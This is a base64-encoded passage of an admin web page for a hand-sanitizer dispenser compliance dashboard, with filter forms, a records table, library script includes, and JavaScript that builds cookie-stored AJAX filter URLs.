xOSIgPkFXUyBUZXN0aW5nPC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMTAxIiA+Q0tlIC0gMzk1MDwvb3B0aW9uPjxvcHRpb24gdmFsdWU9IjEwNiIgPkNLZSAtIDQzNjY8L29wdGlvbj48b3B0aW9uIHZhbHVlPSIxMjMiID5DS2UgLSA0OTI3PC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMTE5IiA+Q0tvIC0gNDI5ODwvb3B0aW9uPjxvcHRpb24gdmFsdWU9IjEyMCIgPkNLbyAtIDQ2Njg8L29wdGlvbj48b3B0aW9uIHZhbHVlPSI3OCIgPkRIMTQyMTwvb3B0aW9uPjxvcHRpb24gdmFsdWU9Ijk1IiA+REgzOTUxPC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMTI4IiA+REg0NzIxPC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMTM0IiA+TEwtMzMxNjwvb3B0aW9uPjxvcHRpb24gdmFsdWU9IjEyNSIgPkxMLTUwMzE8L29wdGlvbj48b3B0aW9uIHZhbHVlPSIzMzEiID5NRU5BIERlbW8gRGlzcGVuc2VyIC0gMzIyMDwvb3B0aW9uPjxvcHRpb24gdmFsdWU9IjExNCIgPlJLIEdhci4gNDAxMDg2IChBMjIyMjMwMDQ3MjkpPC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iOTgiID5SSyBQYXQuIDNGRTFGOCAoQTIyMjIzMDA0NzIyKTwvb3B0aW9uPjxvcHRpb24gdmFsdWU9IjExNSIgPlJLIFB1Yi4gM0ZBQThBIChBMjIyMjMwMDUwODUpPC9vcHRpb24+PC9zZWxlY3Q+PC9kaXY+PC9kaXY+PC9kaXY+PGRpdiBjbGFzcz0iZm9ybS1ncm91cCBmb3JtLWlubGluZSByb3cganVzdGlmeS1jb250ZW50LWNlbnRlciBqdXN0aWZ5LWNvbnRlbnQtbWQtc3RhcnQiPjxkaXYgaWQ9ImV2ZW50X2ZpbHRlcl9jb250YWluZXIiIGNsYXNzPSJjb2wtMTIgY29sLXNtLTggY29sLW1kLTYgY29sLXhsLTQgZC1mbGV4Ij48bGFiZWwgY2xhc3M9ImNvbC00IGp1c3RpZnktY29udGVudC1zdGFydCI+RXZlbnQgPC9sYWJlbD48ZGl2IGNsYXNzPSJjb2wtOCBwLTAiPjxzZWxlY3QgaWQ9ImV2ZW50IiBuYW1lPSJldmVudCIgY2xhc3M9ImZvcm0tY29udHJvbCBpbnB1dC1zbSBjb2wtc20tNiBqdXN0aWZ5LWNvbnRlbnQtc3RhcnQgbXVsdGlwbGUgIiBtdWx0aXBsZSAgIHBsYWNlaG9sZGVybmFtZT0iRXZlbnQiPjxvcHRpb24gdmFsdWU9IlNhbml0aXplZCIgPlNhbml0aXplZDwvb3B0aW9uPjxvcHRpb24gdmFsdWU9IkNoZWNrIEluIiA+Q2hlY2sgSW48L29wdGlvbj48b3B0aW9uIHZhbHVlPSJDaGVjayBPdXQiID5DaGVjayBPdXQ8L29wdGlvbj48L3NlbGVjdD48L2Rpdj48L2Rpdj48L2Rpdj48ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGZvcm0taW5saW5lIHJvdyBqdXN0aWZ5LWNvbnRlbnQtY2VudGVyIGp1c3RpZnktY29udGVudC1tZC1zdGFydCI+PGRpdiBpZD0iY29tcGxpYW5jZV9maWx0ZXJfY29udGFpbmVyIiBjbGFzcz0iY29sLTEyIGNvbC1zbS04IGNvbC1tZC02IGNvbC14bC00IGQtZmxleCI+PGxhYmVsIGNsYXNzPSJjb2wtNCBqdXN0aWZ5LWNvbnRlbnQtc3RhcnQiPkNvbXBsaWFuY2UgPC9sYWJlbD48ZGl2IGNsYXNzPSJjb2wtOCBwLTAiPjxzZWxlY3QgaWQ9ImlzX2NvbXBsaWFudCIgbmFtZT0iaXNfY29tcGxpYW50IiBjbGFzcz0iZm9ybS1jb250cm9sIGlucHV0LXNtIGNvbC1zbS02IGp1c3RpZnktY29udGVudC1zdGFydCAgIiAgICBwbGFjZWhvbGRlcm5hbWU9IkNvbXBsaWFuY2UiPjxvcHRpb24+PC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMCIgPk5PPC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMSIgPllFUzwvb3B0aW9uPjwvc2VsZWN0PjwvZGl2PjwvZGl2PjwvZGl2PjxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgZm9ybS1pbmxpbmUgcm93IGp1c3RpZnktY29udGVudC1jZW50ZXIganVzdGlmeS1jb250ZW50LW1kLXN0YXJ0Ij48ZGl2IGNsYXNzPSJjb2wtMTIgY29sLXNtLTggY29sLW1kLTYgY29sLXhsLTQgZC1mbGV4Ij48bGFiZWwgZm9yPSJEYXRlIFJhbmdlIiBjbGFzcz0iY29sLXNtLTQiIHN0eWxlPSJqdXN0aWZ5LWNvbnRlbnQ6bGVmdCI+RGF0ZSBSYW5nZSA8L2xhYmVsPjxkaXYgY2xhc3M9ImNvbC04IHAtMCIgc3R5bGU9ImZsb2F0OmxlZnQ7Ij48aW5wdXQgY2xhc3M9ImZvcm0tY29udHJvbCBkYXRlUmFuZ2VJbnB1dCBkLWlubGluZS1ibG9jayAiIHR5cGU9InRleHQiIG5hbWU9ImNyZWF0ZWRfYXQiIGlkPSJjcmVhdGVkX2F0IiB2YWx1ZT0iIiBzdHlsZT0id2lkdGg6IDk0JTsiIHBsYWNlaG9sZGVyPSJTZWxlY3QgRGF0ZSIgb25jaGFuZ2U9ImNoYW5nZURhdGVSYW5nZSh0aGlzLnZhbHVlLCAnY3JlYXRlZF9hdGNhbmNlbEJ1dHRvbicpIiAvPjxidXR0b24gaWQ9ImNyZWF0ZWRfYXRjYW5jZWxCdXR0b24iIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImNhbmNlbEJ1dHRvbiBkLW5vbmUiPjxzcGFuIGFyaWEtaGlkZGVuPSJ0cnVlIj7Dlzwvc3Bhbj48L2J1dHRvbj48L2Rpdj48L2Rpdj48L2Rpdj48ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGZvcm0taW5saW5lIGp1c3RpZnktY29udGVudC1jZW50ZXIganVzdGlmeS1jb250ZW50LW1kLXN0YXJ0Ij48YnV0dG9uIGNsYXNzPSJidG4gYnRuLWRhcmsgZmxvYXQtc20tcmlnaHQgbXItMiIgb25jbGljaz0iZmlsdGVyRGF0YSgnZmlsdGVyJykiPlN1Ym1pdDwvYnV0dG9uPjxidXR0b24gY2xhc3M9ImJ0biBidG4tc2Vjb25kYXJ5IGZsb2F0LXNtLXJpZ2h0IG1yLTIiIG9uY2xpY2s9ImZpbHRlckRhdGEoJ3Jlc2V0JykiPlJlc2V0IEZpbHRlcnM8L2J1dHRvbj48L2Rpdj48L2Zvcm0+PC9kaXY+PC9kaXY+ICAgICAgICAgICAgPGRpdiBpZD0iZmllbGRjb25maWciIGNsYXNzPSJyb3ciIHN0eWxlPSJkaXNwbGF5Om5vbmU7bWFyZ2luOjIwcHggMDtib3JkZXItYm90dG9tOjFweCBzb2xpZCAjMzQzYTQwOyI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGZvcm0taW5saW5lIHctMTAwIj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPHRhYmxlIGlkPSJyZWNvcmRzIiBjbGFzcz0idGFibGUgdGFibGUtYm9yZGVyZWQgdGFibGUtaG92ZXIgZGF0YVRhYmxlIiBzdHlsZT0id2lkdGg6MTAwJTsgbWFyZ2luLXRvcDogMHB4ICFpbXBvcnRhbnQ7Ij4KICAgICAgICAgICAgICAgIDx0aGVhZD4KICAgICAgICAgICAgICAgICAgICA8dHIgcm9sZT0icm93Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPHRoPkV2ZW50PC90aD48dGg+T3JnYW5pemF0aW9uPC90aD48dGg+R3JvdXA8L3RoPjx0aD5EaXNwZW5zZXI8L3RoPjx0aD5Vc2VyPC90aD48dGg+VGFnPC90aD48dGg+VGFnIFJTU0kgKGRCbSk8L3RoPjx0aD5Db21wbGlhbmNlPC90aD48dGg+RGF0ZTwvdGg+ICAgICAgICAgICAgICAgICAgICA8L3RyPgogICAgICAgICAgICAgICAgPC90aGVhZD4KICAgICAgICAgICAgPC90YWJsZT4KICAgICAgICA8L2Rpdj4KICAgIDwvc2VjdGlvbj4KPC9kaXY+CiAgICA8L2Rpdj4KICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9qcy9qcXVlcnkubWluLmpzIj48L3NjcmlwdD4KICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9qcy9qcXVlcnktdWkubWluLmpzIj48L3NjcmlwdD4KICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9qcy9ib290c3RyYXAuYnVuZGxlLm1pbi5qcyI+PC9zY3JpcHQ+CiAgICAgICAgCiAgICAgICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vanMvZGF0YXRhYmxlcy9qcXVlcnkuZGF0YVRhYmxlcy5taW4uanMiPjwvc2NyaXB0PgogICAgICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2pzL2RhdGF0YWJsZXMvZGF0YVRhYmxlcy5ib290c3RyYXAubWluLmpzIj48L3NjcmlwdD4KICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9qcy9kYXRhdGFibGVzL2RhdGFUYWJsZXMuYm9vdHN0cmFwNC5taW4uanMiPjwvc2NyaXB0PgogICAgICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2pzL2RhdGF0YWJsZXMvZGF0YVRhYmxlcy5yZXNwb25zaXZlLm1pbi5qcyI+PC9zY3JpcHQ+CiAgICAgICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vanMvZGF0YXRhYmxlcy9yZXNwb25zaXZlLmJvb3RzdHJhcDQubWluLmpzIj48L3NjcmlwdD4KICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9qcy9kYXRhdGFibGVzL2RhdGFUYWJsZXMuYnV0dG9ucy5taW4uanMiPjwvc2NyaXB0PgogICAgICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2pzL2RhdGF0YWJsZXMvYnV0dG9ucy5ib290c3RyYXA0Lm1pbi5qcyI+PC9zY3JpcHQ+CiAgICAgICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vanMvZGF0YXRhYmxlcy9qc3ppcC5taW4uanMiPjwvc2NyaXB0PgogICAgICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2pzL2RhdGF0YWJsZXMvcGRmbWFrZS5taW4uanMiPjwvc2NyaXB0PgogICAgICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2pzL2RhdGF0YWJsZXMvdmZzX2ZvbnRzLmpzIj48L3NjcmlwdD4KICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9qcy9kYXRhdGFibGVzL2J1dHRvbnMucHJpbnQubWluLmpzIj48L3NjcmlwdD4KICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9qcy9kYXRhdGFibGVzL2J1dHRvbnMuaHRtbDUubWluLmpzIj48L3NjcmlwdD4KICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9qcy9kYXRhdGFibGVzL2RhdGF0YWJsZXNJbnB1dC5qcyI+PC9zY3JpcHQ+CiAgICAgICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vanMvZGF0YXRhYmxlcy9kYXRhVGFibGVzLmZpeGVkQ29sdW1ucy5qcyI+PC9zY3JpcHQ+CiAgICAgICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vanMvZGF0YXRhYmxlcy9kYXRhVGFibGVzLmNvbFJlb3JkZXIubWluLmpzIj48L3NjcmlwdD4KCiAgICAgICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vanMvdmFsaWRhdGlvbi5qcyI+PC9zY3JpcHQ+CiAgICAgICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vanMvYWRtaW4uanMiPjwvc2NyaXB0PgogICAgICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2pzL2FwcC5qcyI+PC9zY3JpcHQ+CiAgICAgICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vanMvc2NyaXB0cy5qcz92PTZlYzQyMSI+PC9zY3JpcHQ+CiAgICAgICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vanMvbW9tZW50Lm1pbi5qcyI+PC9zY3JpcHQ+CiAgICAgICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vanMvZGF0ZXJhbmdlcGlja2VyLm1pbi5qcyI+PC9zY3JpcHQ+CiAgICAgICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vanMvc2VsZWN0Mi5taW4uanMiPjwvc2NyaXB0PgoKICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvaHRtbDJjYW52YXMvMS40LjEvaHRtbDJjYW52YXMubWluLmpzIj48L3NjcmlwdD4KICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvanNwZGYvMS4zLjQvanNwZGYubWluLmpzIj48L3NjcmlwdD4KCiAgICAgICAgPHNjcmlwdD4KICAgICAgICAgICAgdmFyIEJBU0VfQURNSU4gPSAnaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS8nOwogICAgICAgICAgICB2YXIgdHlwZSA9ICdVc2VyVG90YWxFdmVudHMnOwogICAgICAgIDwvc2NyaXB0PgogICAgPC9ib2R5Pgo8L2h0bWw+CjxzY3JpcHQgc3JjPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2pzL2RhdGF0YWJsZUV4cG9ydC5qcyI+PC9zY3JpcHQ+CjxzY3JpcHQ+CiAgICB2YXIgc29ydEluZGV4ID0gODsKICAgIHZhciBzb3J0T3JkZXIgPSAiZGVzYyI7CiAgICB2YXIgY29sdW1uTGlzdENvdW50ZXIgPSAwOwogICAgaWYgKHR5cGUuaW5kZXhPZignTG9nJyk+MCkgewogICAgICAgIHNvcnRPcmRlciA9ICJkZXNjIjsKICAgIH0KICAgIHZhciBjb2x1bW5TdHIgPSBbeyJkYXRhIjoiZXZlbnQifSx7ImRhdGEiOiJvcmdhbml6YXRpb25faWQifSx7ImRhdGEiOiJkaXNwZW5zZXJfZ3JvdXBfaWQifSx7ImRhdGEiOiJkaXNwZW5zZXJfaWQifSx7ImRhdGEiOiJ1c2VyX2lkIn0seyJkYXRhIjoidGFnX2lkIn0seyJkYXRhIjoidGFnX3Jzc2kifSx7ImRhdGEiOiJpc19jb21wbGlhbnQifSx7ImRhdGEiOiJjcmVhdGVkX2F0In0sXTsKICAgIHZhciBkYXRhVGFibGVDb2x1bW5TdHIgPSBjb2x1bW5TdHI7CiAgICB2YXIgcGFnZUxlbmd0aCA9IDEwMDsKICAgIHZhciBzZWFyY2hpbmcgPSBmYWxzZTsKICAgIHZhciBhcHBseUZpbHRlciA9IDA7CiAgICB2YXIgc3RhcnREYXRlID0gIiI7CiAgICB2YXIgZW5kRGF0ZSA9ICIiOwogICAgdmFyIHVzZXJJZCA9ICIiOwogICAgdmFyIGZpbHRlckRpc3BlbnNlcklkID0gIiI7CiAgICB2YXIgZmlsdGVyVGFnSWQgPSAiIjsKICAgIHZhciBmaWx0ZXJEaXNwZW5zZXJHcm91cElkID0gIiI7CiAgICB2YXIgZmlsdGVyVXNlclR5cGVJZCA9ICIiOwogICAgdmFyIGZpbHRlck9yZ2FuaXphdGlvbklkID0gIiI7CiAgICB2YXIgZmlsdGVyQmF0dGVyeVN0YXR1cyA9ICIiOwogICAgdmFyIGZpbHRlckxpcXVpZExldmVsID0gIiI7CiAgICB2YXIgZmlsdGVyRmllbGQgPSAiIjsKICAgIHZhciBiSW5mbyA9ICIxIjsKICAgIHZhciBzaG93RmlsdGVyT3B0aW9ucyA9ICIiOwogICAgdmFyIGNvbHVtbnNMaXN0ID0gW107CiAgICB2YXIgY29sdW1uRGVmcyA9ICIiOwogICAgaWYgKHR5cGUgPT0gJ1VzZXInKSB7CiAgICAgICAgY29sdW1uRGVmcyA9IFt7CiAgICAgICAgICAgICAgICB0YXJnZXRzOiBbOV0sCiAgICAgICAgICAgICAgICAiY2xhc3NOYW1lIjogInRhYmxlRWRpdGFibGUgZC1mbGV4IHByLTMgIgogICAgICAgICAgICB9XTsKICAgIH0KICAgIGZvciAobGV0IGk9Y29sdW1uTGlzdENvdW50ZXI7IGk8Y29sdW1uU3RyLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgY29sdW1uc0xpc3QucHVzaChpKTsKICAgIH0KCiAgICB2YXIgZWRpdFBlcm1pc3Npb24gPSBmYWxzZTsKICAgIHZhciBkYXRhdGFibGUgPSBudWxsOwoKICAgIHZhciB1c2VDb29raWUgPSAiMSI7CiAgICB2YXIgY29va2llTmFtZSA9IHR5cGU7CiAgICB2YXIgYWpheFVybCA9ICJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJUb3RhbEV2ZW50cy8/YWpheD10cnVlIjsKICAgIHZhciByZXZlcnNlQ29uZGl0aW9uQWRkaXRpb25GaWx0ZXIgPSBbJ1Nhbml0aXphdGlvbnMnLCAnTWlzc2VkT3Bwb3J0dW5pdGllcycsICdDb21wbGlhbnRFdmVudHMnXTsKICAgIGxldCBhZGRpdGlvbmFsRmlsdGVyVGV4dCA9ICcnOwogICAgbGV0IGRhdGVSYW5nZUZpbHRlcnMgPSBbJ2NyZWF0ZWRfYXQnLCAnY2hhbmdlZF9hdCcsICdyZXF1ZXN0ZWRfYXQnLCAndXBkYXRlZF9hdCcsICd3aWZpX2FjdGl2YXRpb25fZGF0ZScsICdsYXN0X2xpcXVpZF9yZWZpbGxfZGF0ZScsICdzYW5pdGl6ZWRfYXQnLCAnbGFzdF91cGRhdGVkX2F0JywgJ2FjdGl2aXR5X2RhdGUnLCAnbW9kaWZpZWRfYXQnXTsKICAgIGxldCBzZXREYXRlUmFuZ2VGaWx0ZXJzID0ge307CiAgICBsZXQgYWRkaXRpb25hbEZpbHRlck9wdGlvbiA9IHsnU2FuaXRpemF0aW9ucyc6J2ZhbHNlJywgJ1N0YWZmUGVyZm9ybWFuY2UnOid0cnVlJywgJ0Rpc3BlbnNlcic6J3RydWUnLCAnVGFnJzondHJ1ZScsICdVc2VyJzondHJ1ZScsICdDb21wbGlhbnRFdmVudHMnOidmYWxzZScsICdNaXNzZWRPcHBvcnR1bml0aWVzJzonZmFsc2UnfTsKICAgIGxldCB0ZW1wRmlsdGVyT3B0aW9ucyA9IHt9OwogICAgbGV0IGlubGluZUVkaXRpbmcgPSAiIjsKICAgIGxldCBmaXhlZENvbHVtbk5vcyA9IDA7CiAgICBsZXQgY29sUmVvcmRlckZpeGVkQ29scyA9IDA7CiAgICBpZiAodHlwZSA9PSAnRGlzcGVuc2VyJykgewogICAgICAgIGZpeGVkQ29sdW1uTm9zID0gMjsKICAgICAgICBjb2xSZW9yZGVyRml4ZWRDb2xzID0gMjsKICAgIH0gZWxzZSBpZiAodHlwZSA9PSAnRGlzcGVuc2VyR3JvdXAnIHx8IHR5cGUgPT0gJ1RhZycgfHwgdHlwZSA9PSAnVXNlcicpIHsKICAgICAgICBjb2xSZW9yZGVyRml4ZWRDb2xzID0gMTsKICAgIH0KCiAgICBpZiAodXNlQ29va2llKSB7CiAgICAgICAgdmFyIGNvb2tpZVVybCA9IGdldENvb2tpZShjb29raWVOYW1lKTsKICAgICAgICBpZiAodHlwZW9mIGNvb2tpZVVybCAhPT0gJ3VuZGVmaW5lZCcgJiYgY29va2llVXJsKSB7CiAgICAgICAgICAgIGFqYXhVcmwgPSBjb29raWVVcmw7CiAgICAgICAgfQogICAgICAgIHNldENvb2tpZShjb29raWVOYW1lLCBhamF4VXJsLCAzMCk7CgogICAgICAgIGlmIChhamF4VXJsLmluY2x1ZGVzKCJmaWx0ZXIiKSkgewogICAgICAgICAgICB2YXIgcGFyYW1zID0gYWpheFVybC5zcGxpdCgnPycpOwogICAgICAgICAgICBpZiAocGFyYW1zLmxlbmd0aCA+IDEpIHsKICAgICAgICAgICAgICAgIHBhcmFtcyA9IHBhcmFtc1sxXS5zcGxpdCgnJicpOwogICAgICAgICAgICAgICAgaWYgKHBhcmFtcy5pbmNsdWRlcygiZmlsdGVyPXRydWUiKSkgewogICAgICAgICAgICAgICAgICAgIHNob3dGaWx0ZXJzKCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZm9yIChsZXQgaT0wOyBpPHBhcmFtcy5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgdmFyIHBhcmFtID0gcGFyYW1zW2ldLnNwbGl0KCc9Jyk7CiAgICAgICAgICAgICAgICBpZiAocGFyYW0ubGVuZ3RoID4gMSkgewogICAgICAgICAgICAgICAgICAgIGlmICgkKCcjJytwYXJhbVswXSkubGVuZ3RoID4gMCAmJiBwYXJhbVsxXS5sZW5ndGggPiAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkKCcjZmlsdGVyRm9ybSAjJytwYXJhbVswXSkucHJvcCgndHlwZScpID09ICd0ZXh0JykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRhdGVSYW5nZUZpbHRlcnMuaW5jbHVkZXMocGFyYW1bMF0pKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFyYW1bMV0gPSBwYXJhbVsxXS5yZXBsYWNlQWxsKCcrJywgJyAnKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkKCcjZmlsdGVyRm9ybSAjJytwYXJhbVswXSkudmFsKHBhcmFtWzFdKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZXREYXRlUmFuZ2VGaWx0ZXJzW3BhcmFtWzBdXSA9IHBhcmFtWzFdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkKCcjZmlsdGVyRm9ybSAjJytwYXJhbVswXSkudmFsKHBhcmFtWzFdKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmIChwYXJhbVswXSA9PSAnYWRkaXRpb25hbEZpbHRlcicgJiYgcGFyYW1bMV0gPT0gJ2ZhbHNlJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJCgnI2FwcGx5QWRkaXRpb25hbEZpbHRlcicpLnByb3AoJ2NoZWNrZWQnLCB0cnVlKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgkKCcjZmlsdGVyRm9ybSAjJytwYXJhbVswXSkucHJvcCgndHlwZScpID09ICdzZWxlY3QtbXVsdGlwbGUnKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZW1wRmlsdGVyT3B0aW9ucyA9IHBhcmFtWzFdLnNwbGl0KCcsJyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkLmVhY2godGVtcEZpbHRlck9wdGlvbnMsIGZ1bmN0aW9uKGtleSwgdmFsdWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkKCcjZmlsdGVyRm9ybSAjJytwYXJhbVswXSsnIG9wdGlvblt2YWx1ZT0iJyt2YWx1ZSsnIl0nKS5hdHRyKCJzZWxlY3RlZCIsIHRydWUpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkKCcjZmlsdGVyRm9ybSAjJytwYXJhbVswXSsnIG9wdGlvblt2YWx1ZT0iJytwYXJhbVsxXSsnIl0nKS5hdHRyKCJzZWxlY3RlZCIsIHRydWUpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIGlmIChyZXZlcnNlQ29uZGl0aW9uQWRkaXRpb25GaWx0ZXIuaW5jbHVkZXModHlwZSkpIHsKICAgICAgICAgICAgJCgnI2FwcGx5QWRkaXRpb25hbEZpbHRlcicpLnByb3AoJ2NoZWNrZWQnLCB0cnVlKTsKICAgICAgICB9CiAgICB9IGVsc2UgaWYgKCF1c2VDb29raWUgJiYgcmV2ZXJzZUNvbmRpdGlvbkFkZGl0aW9uRmlsdGVyLmluY2x1ZGVzKHR5cGUpKSB7CiAgICAgICAgJCgnI2FwcGx5QWRkaXRpb25hbEZpbHRlcicpLnByb3AoJ2NoZWNrZWQnLCB0cnVlKTsKICAgIH0KCiAgICAkKGRvY3VtZW50KS5yZWFkeShmdW5jdGlvbigpIHsKICAgICAgICBpZiAoISQuaXNFbXB0eU9iamVjdChzZXREYXRlUmFuZ2VGaWx0ZXJzKSkgewogICAgICAgICAgICBmb3IgKHZhciBrZXkgaW4gc2V0RGF0ZVJhbmdlRmlsdGVycykgewogICAgICAgICAgICAgICAgJCgnI2ZpbHRlckZvcm0gIycra2V5KS52YWwoc2V0RGF0ZVJhbmdlRmlsdGVyc1trZXldKS50cmlnZ2VyKCdjaGFuZ2UnKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZiAoYXBwbHlGaWx0ZXIpIHsKICAgICAgICAgICAgdmFyIGJhc2VVcmwgPSAiaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyVG90YWxFdmVudHMvP2FqYXg9dHJ1ZSZmaWx0ZXI9dHJ1ZSI7CiAgICAgICAgICAgIGlmIChzdGFydERhdGUpIHsKICAgICAgICAgICAgICAgICQoJyMnK2ZpbHRlckZpZWxkKS52YWwoc3RhcnREYXRlICsgJyAtICcgKyBlbmREYXRlKTsKICAgICAgICAgICAgICAgIGJhc2VVcmwgKz0gIiYiK2ZpbHRlckZpZWxkKyI9IitzdGFydERhdGUgKyAnIC0gJyArIGVuZERhdGU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGZpbHRlck9yZ2FuaXphdGlvbklkKSB7CiAgICAgICAgICAgICAgICAkKCcjb3JnYW5pemF0aW9uX2lkJykudmFsKGZpbHRlck9yZ2FuaXphdGlvbklkKS50cmlnZ2VyKCdjaGFuZ2UnKTsKICAgICAgICAgICAgICAgIGJhc2VVcmwgKz0gIiZvcmdhbml6YXRpb25faWQ9IitmaWx0ZXJPcmdhbml6YXRpb25JZDsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAodXNlcklkKSB7CiAgICAgICAgICAgICAgICAkKCcjJytmaWx0ZXJGaWVsZCkudmFsKHVzZXJJZCkudHJpZ2dlcignY2hhbmdlJyk7CiAgICAgICAgICAgICAgICBiYXNlVXJsICs9ICImIitmaWx0ZXJGaWVsZCsiPSIrdXNlcklkOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChmaWx0ZXJVc2VyVHlwZUlkKSB7CiAgICAgICAgICAgICAgICAkKCcjcm9sZV9pZCcpLnZhbChmaWx0ZXJVc2VyVHlwZUlkKS50cmlnZ2VyKCdjaGFuZ2UnKTsKICAgICAgICAgICAgICAgIGJhc2VVcmwgKz0gIiZyb2xlX2lkPSIrZmlsdGVyVXNlclR5cGVJZDsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoZmlsdGVyRGlzcGVuc2VySWQpIHsKICAgICAgICAgICAgICAgICQoJyNkaXNwZW5zZXJfaWQnKS52YWwoZmlsdGVyRGlzcGVuc2VySWQpLnRyaWdnZXIoJ2NoYW5nZScpOwogICAgICAgICAgICAgICAgYmFzZVVybCArPSAiJmRpc3BlbnNlcl9pZD0iK2ZpbHRlckRpc3BlbnNlcklkOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChmaWx0ZXJUYWdJZCkgewogICAgICAgICAgICAgICAgJCgn